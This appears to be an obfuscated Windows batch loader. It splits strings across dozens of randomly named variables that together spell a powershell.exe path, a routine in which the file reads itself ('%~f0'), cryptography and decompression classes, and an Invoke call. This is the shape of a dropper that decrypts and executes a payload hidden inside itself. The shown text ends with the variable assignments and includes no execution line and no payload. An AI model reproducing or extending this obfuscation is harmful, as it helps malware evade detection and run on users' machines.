@echo off
set "sMlleuMFDs=nd"
set "QnYcJwPSsg=po"
set "ZRlCtBeWZx=Wi"
set "rDdNRIeKZu=s\"
set "ZATrrHSEzS=Sy"
set "iGtRJCowuh=0\"
set "aSdeRXthrT=he"
set "xTFTvIVMPQ=he"
set "lrkaqucTwR=1."
set "utVrgOIxtv=em"
set "ApmsVewTPJ= C"
set "udqMgsgKbH=ow"
set "tyAgFieDom=we"
set "MuaCCpKWXV=y "
set "hqzxoLLHjN=Po"
set "PXmuHSuzfC= /"
set "JZYzxRXgvB=co"
set "LCeVARiLWs=ws"
set "RSablFAtxi=rS"
set "uePDmZjAek=:\"
set "AoEEHdOmvv=ll"
set "bVPDnSHmdZ=rs"
set "hEpYaFFClC=in"
set "qbGjtUkYuz=32"
set "YvkdBlWNrW=do"
set "oHNRAesiHj=we"
set "PCPtfAuvpH=xe"
set "xKihgVyuPQ=.e"
set "FjBqyKfmmB=ll"
set "ACljvNGsXW=\W"
set "mDWLQVAzva=st"
set "xWooHAeiYQ=py"
set "zaeMBopxmI=\v"
set "mCvUVNwVPo=cd"
set "KhabWfxPYS= %~dp0"
set "nrYILUINIF=ptor"
set "XpzdiTVgsG=ect "
set "uoXKOoRYOx=F.Su"
set "pqiLOmYmyO=+hAO"
set "XoaNSODRvt=tem."
set "UdPbYJxflL= '')"
set "nBXLiqSOVe= = $"
set "kuaMNdhrNs=);$W"
set "ZdsGKtCTZH=rans"
set "TNDOkxYDvW=nirt"
set "dzDausgOPm=Wqjt"
set "rICChDhddu==');"
set "ARMDwvZryu=vj0m"
set "tpdSkrzihf=.-16"
set "XkKiEBUgkz=oin "
set "tAgEChANmk=form"
set "pbUvgWWgHQ=]::N"
set "ryWGazrPbU=$IeJ"
set "ELHxNWuAlL=and "
set "iRmbSELJPU=jt.I"
set "wRHVnqdiZL=New-"
set "eKuQatWotW=).Sp"
set "JZAyBqkCkr=jW, "
set "hvYsAHHhxh=esFX"
set "tqulYUHSEX=.Con"
set "UbcsSgDFel=m.Re"
set "OCfwMvIBwq=le  "
set "ztMjPSVyRa=sGUc"
set "RILwoxCQBU=onve"
set "SBjZUSSaug=poSj"
set "nMfBPZoapZ=Fina"
set "jBWrrtbigk=iron"
set "KslEcLNKGb='gni"
set "LytSgSlaTp=$Yha"
set "xijujIukcr=xkF."
set "dSHFIaTnMD=yste"
set "hPtRWHQSjT=;$wH"
set "jFNfbgBBSs=sion"
set "TKJnETVPeq=bjec"
set "vaXmadHKiW=ispo"
set "DIxUSYywHv=xTBR"
set "yQISdKmoXv=$IeJ"
set "CeWdBYtBdz=bstr"
set "DCIyzNUMdU=morF"
set "jkroZWoUXo=nage"
set "OzMqvnrngO=TllA"
set "XaYsvFLLNf=.Cry"
set "cpEPBVJIBL=[IO."
set "HaEFTqUdVO=vert"
set "UfuAvjEUnJ=isfL"
set "DkxThkAZin=F'[-"
set "uRmDzKCgkP=YGdQ"
set "fPibThDBrX=[]] "
set "LUpLWqtbkn=Wqjt"
set "gxzfbepFCa== $z"
set "jrvTFQunyL=..-1"
set "LcZuaQpiXA=join"
set "tHcDSejkYC=('%*'"
set "zhNnjjMgNv=[Env"
set "VxnIAowqSk= = $"
set "BXLJuHIMGf=tem."
set "VKLghbeGyq=N = "
set "OyDMNxzPSw=-ep "
set "ZGTYyiJjWC=;$po"
set "suVCuPhYOS=ose("
set "ZLmyJQDDer='dqR"
set "rgSCZlDKSi=$Gpi"
set "XCRtFOQqMH=::De"
set "RJGqeHdCap=daeR"
set "MzpsvIKDhG=($LO"
set "DxvhMwRmUC=g = "
set "pjFcdQmVTx=)))"
set "WgykuQpJWh=ress"
set "JMPOBHKWJb=;$wH"
set "VrYVyeIULC=esMa"
set "LwgFOifxCR=eJaN"
set "SutEmCJvqf=.Mem"
set "mXHToUSFEX=e = "
set "LUeewqfKTp= [st"
set "esCHikJsxc=em.I"
set "GTfCnNLthj=..-1"
set "AsjTzMPRiI=ck($"
set "jxSHqYvdne=eJaN"
set "amDXNiDiHP=-4] "
set "FbTjQfPNyi=Disp"
set "gtvWgBLQBI=rity"
set "KlrvjQqruo='[-1"
set "fIUkMXvyZS=TT ="
set "smRhMCciPM=oArr"
set "NvZywoFwNt=.Dis"
set "RppPlyMqhx=[Sys"
set "uIcaOTMvhv=zWqj"
set "jfIyEWGIBD=ke($"
set "YlsMPZpBET=Invo"
set "xERScPaXJQ=mory"
set "VQMlHGQhHm=1..-"
set "deqzWihavo=16] "
set "SvVTZPNRmW=6] -"
set "cPjVUDSdHr=raph"
set "vjEPPhEgjv=Wqjt"
set "nPdotezwmG=('%~f0'"
set "ogHXKEeXpG=ay()"
set "BQRyuVRtuK=ress"
set "dMBPHGNOjp=raph"
set "NsfpyzwYAt=dQ.D"
set "CJRFDOWudV=($LO"
set "fUmIwDKxkL=]::C"
set "gmVQSdJGbb=('da"
set "UoHyGqxxsJ=ew-O"
set "UTukUJdlWd=pStr"
set "PMDOnzeYFm=0O+g"
set "bvlxipxPYC=ert]"
set "OVfazhMWNL=$poS"
set "UeTtbgmoqp=pose"
set "zMMqVJydtf=m(, "
